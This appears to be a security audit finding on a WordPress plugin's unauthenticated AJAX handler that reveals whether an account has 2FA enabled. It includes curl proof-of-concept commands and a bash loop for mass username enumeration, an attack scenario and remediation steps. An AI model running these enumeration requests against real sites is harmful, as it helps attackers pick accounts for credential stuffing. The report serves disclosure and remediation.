# VULN-001: Unauthenticated 2FA Status Disclosure via simbatfa-init-otp

## Severity: Medium (CVSS ~5.3)

## Summary

The `wp_ajax_nopriv_simbatfa-init-otp` AJAX handler allows any unauthenticated user to determine whether a specific WordPress account has Two-Factor Authentication (2FA/TFA) enabled. This enables targeted credential-stuffing attacks against accounts known to lack 2FA protection.

## Affected File

- `includes/simba-tfa/simba-tfa.php` lines 114, 943-986

## Technical Details

### Registration (line 114)

```php
add_action('wp_ajax_nopriv_simbatfa-init-otp', array($this, 'tfaInitLogin'));
```

The handler is registered on the `nopriv` hook, making it accessible to any visitor without authentication.

### Handler: tfaInitLogin() (lines 943-986)

The method:
1. Reads `$_POST['user']` (username or email)
2. Calls `sanitize_user(stripslashes($_POST['user']))` 
3. Queries the database to find the user via `wp_authenticate_username_password()` or direct DB lookup
4. Calls `pre_auth()` which checks if TFA is enabled for that user
5. Returns JSON: `{"jsonstarter":"justhere","status":true}` if TFA is enabled, `{"status":false}` otherwise

### No authentication or anti-automation controls

- No nonce verification
- No rate limiting at the PHP level
- No CAPTCHA requirement
- No IP-based throttling for this specific endpoint

## Proof of Concept

```bash
# Check if user 'admin' has 2FA enabled
curl -s -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=simbatfa-init-otp&user=admin' | jq .

# Response if TFA enabled:
# {"jsonstarter":"justhere","status":true,"user_can_trust":1}

# Response if TFA disabled or user doesn't exist:
# {"jsonstarter":"justhere","status":false}

# Mass enumeration
for user in admin editor author contributor subscriber; do
  status=$(curl -s -X POST 'https://target.com/wp-admin/admin-ajax.php' \
    -d "action=simbatfa-init-otp&user=$user" | jq -r .status)
  echo "$user: 2FA=$status"
done
```

## Attack Scenario

1. Attacker obtains a list of usernames (via WordPress author archives, XML-RPC user enumeration, or wp-json/wp/v2/users)
2. Attacker queries each username against the simbatfa-init-otp endpoint
3. Accounts returning `status:false` are identified as lacking 2FA
4. Attacker focuses credential-stuffing or password spraying on these weaker accounts
5. If login lockout is enabled but uses a spoofable IP method (see VULN-002), the attacker can also bypass rate limiting

## Impact

- **Information Disclosure**: Reveals per-user 2FA enrollment status
- **User Enumeration**: Confirms whether usernames/emails exist (behavioral difference in response)
- **Targeted Attacks**: Enables attackers to prioritize accounts without 2FA for credential attacks

## Root Cause

The handler is intentionally unauthenticated because it is called from the login form JavaScript before the user submits credentials (to dynamically show/hide the OTP field). However, there is no anti-automation protection to prevent bulk enumeration.

## Remediation Recommendations

1. Add rate limiting (e.g., max 5 requests per IP per minute) to the handler
2. Require a nonce embedded in the login form (login_form nonce)
3. Return the same response regardless of TFA status and always show the OTP field
4. At minimum, add a short delay (e.g., 500ms) to slow enumeration
